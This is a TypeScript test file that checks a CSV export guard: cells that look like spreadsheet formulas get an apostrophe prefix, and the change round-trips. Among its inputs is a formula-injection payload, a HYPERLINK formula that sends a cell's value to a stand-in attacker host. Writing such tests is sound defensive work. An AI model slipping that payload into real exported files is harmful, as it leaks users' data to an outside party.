import { describe, expect, it } from "vitest";
import { CSV_FORMULA_CELL, neutraliseCsvFormula, restoreCsvFormula } from "./csv.ts";

/** US-OPS-18 (security review) — CSV cells never run as spreadsheet formulas. */
describe("US-OPS-18 · CSV formula guard", () => {
  const formulas = ['=HYPERLINK("https://evil.example/?"&A1,"Open")', "+1-555-0100", "-2+3", "@SUM(A1:A9)", "\t=1+1", "\r=1+1", "-", "=-5"];
  const plain = ["-1234.56", "-5", "1234.56", "0", "Smith & Co", "", "a=b", "Retention -5%", "'quoted"];

  it.each(formulas)("guards %j with an apostrophe", (value) => {
    expect(CSV_FORMULA_CELL.test(value)).toBe(true);
    expect(neutraliseCsvFormula(value)).toBe(`'${value}`);
  });

  it.each(plain)("leaves %j as it is", (value) => {
    expect(neutraliseCsvFormula(value)).toBe(value);
  });

  it.each([...formulas, ...plain])("round-trips %j through export and import", (value) => {
    expect(restoreCsvFormula(neutraliseCsvFormula(value))).toBe(value);
  });
});
